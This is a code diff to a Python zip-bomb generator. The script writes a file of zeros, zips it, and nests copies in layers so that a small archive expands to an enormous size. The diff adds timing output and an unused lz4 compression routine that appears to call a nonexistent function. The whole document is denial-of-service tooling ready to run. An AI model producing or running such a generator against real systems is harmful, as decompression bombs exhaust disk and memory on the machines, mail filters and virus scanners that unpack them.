@@ -1,9 +1,8 @@
-import zlib
 import zipfile
 import shutil
 import os
-import sys
 import time
+import lz4.frame
 
 
 def fileSize(filename):
@@ -12,10 +11,10 @@ def fileSize(filename):
 
 
 def makeTempFile(filename):
-    with open(filename, 'w') as cache:
-        for i in range(1024):
-            cache.write(1048576 * '0')
-
+    with open(filename, 'wb') as cache:
+        for i in range(1):
+            chunk = bytearray(1048576 * b'0')
+            cache.write(chunk)
 
 
 def filenameNoExt(name):
@@ -27,6 +26,18 @@ def fileExt(name):
 
 
 def compressFile(infile, outfile):
+    with open(infile, "rb") as f_in:
+        with open(outfile, "wb") as f_out:
+            compressor = lz4.frame.LZ4F_compressFrame
+            block_size = 1024*1024
+            while True:
+                data = f_in.read(block_size)
+                if not data:
+                    break
+                compressed_data = compressor(data)
+                f_out.write(compressed_data)
+
+def compressFileOld(infile, outfile):
     zf = zipfile.ZipFile(outfile, mode='w', allowZip64=True)
     zf.write(infile, compress_type=zipfile.ZIP_DEFLATED)
     zf.close()
@@ -49,14 +60,21 @@ def makeBomb(levels, fileName):
     dummy_name = 'cache.txt'
     start_time = time.time()
     # Start
+    time1 = int(time.time())
     print('making "cache" file...\n')
     makeTempFile(dummy_name)
+    time2=time.time()
+    print('done making cache. making 1.zip. action took %.2f\n' % (time.time()-time1))
     level_1_zip = '1.zip'
+    time3=time.time()
     print('compressing...\n')
-    compressFile(dummy_name, level_1_zip)
+    compressFileOld(dummy_name, level_1_zip)
+    time4=time.time()
+    decompressed_size = 0.1
+    print('done compressing. removing cache. action took %.2f\n' % (time.time()-time3))
     os.remove(dummy_name)
-    decompressed_size = 1
-    print('starting layers...\n')
+    print('done removing. action took %.2f\n' % (time.time()-time4))
+    print('starting layers... to now took %.2f\n' % (time.time()-start_time))
     for i in range(1, n_levels + 1):
         copyandcompress('%d.zip' % i, '%d.zip' % (i + 1), 10)
         decompressed_size *= 10
@@ -73,14 +91,15 @@ def makeBomb(levels, fileName):
     return out_zip_file
 
 
-level = str(input('level: the more the merrier'))
+
+level = str(input('level: the more the merrier\n'))
 print('\n')
 name = str(input('desired file name-EX: [name].zip\n'))
 t1 = name.split(".")
 t2 = len(t1)
 if (t2 == 1):
     name = name + ".zip"
-    print("\n you did not enter a .zip file, so we added it for you\n")
+    print("\nyou did not enter a .zip file, so we added it for you\n")
 makeBomb(int(level), name)
 
 # if __name__ == '__main__':
@@ -88,3 +107,7 @@ makeBomb(int(level), name)
 #		print ('Usage:\n')
 #		print (' zipbomb.py n_levels out_zip_file')
 #		exit()
+
+
+
+
